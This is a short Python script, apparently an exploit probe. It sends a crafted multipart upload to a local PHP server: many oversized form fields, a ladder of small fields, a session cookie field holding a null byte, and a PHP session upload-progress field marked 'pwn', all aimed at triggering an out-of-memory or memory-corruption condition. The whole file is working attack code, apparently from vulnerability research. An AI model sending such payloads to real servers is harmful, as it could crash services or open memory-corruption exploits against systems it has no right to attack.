#!/usr/bin/env python3
"""OOM-in-cookie A with an explicit ladder of small field value lengths.

usage: send_a_oomcookie2.py N_BIG BL L1,L2,...
Fields: N_BIG big values (BL bytes), then one field per ladder length,
then PHPSESSID=\x00, PROGRESS, file part.
"""
import socket,sys
NB=int(sys.argv[1]); BL=int(sys.argv[2])
LAD=[int(x) for x in sys.argv[3].split(',') if x!=''] if len(sys.argv)>3 else []
BND=b'S'*17
parts=[]
for i in range(NB):
    parts.append({'name':('b%04d'%i)[:5],'data':b'B'*BL})
for i,L in enumerate(LAD):
    parts.append({'name':('s%04d'%i)[:5],'data':b'S'*L})
parts.append({'name':'PHPSESSID','data':b'\x00'})
parts.append({'name':'PHP_SESSION_UPLOAD_PROGRESS','data':b'pwn'})
parts.append({'name':'f','filename':'a.txt','data':b'A'*64})
o=bytearray()
for p in parts:
    o+=b'--'+BND+b'\r\n'
    if 'filename' in p:
        o+=b'Content-Disposition: form-data; name="'+p['name'].encode()+b'"; filename="'+p['filename'].encode()+b'"\r\nContent-Type: application/octet-stream\r\n\r\n'
    else:
        o+=b'Content-Disposition: form-data; name="'+p['name'].encode()+b'"\r\n\r\n'
    o+=p['data']+b'\r\n'
o+=b'--'+BND+b'--\r\n'
h=(f'POST /index.php HTTP/1.1\r\nHost: 127.0.0.1:8088\r\nContent-Type: multipart/form-data; boundary={BND.decode()}\r\nContent-Length: {len(o)}\r\nConnection: close\r\n\r\n').encode()
s=socket.create_connection(('127.0.0.1',8088),timeout=40); s.settimeout(40)
try: s.sendall(h+bytes(o))
except OSError: pass
try:
    while s.recv(65536): pass
except OSError: pass
s.close()
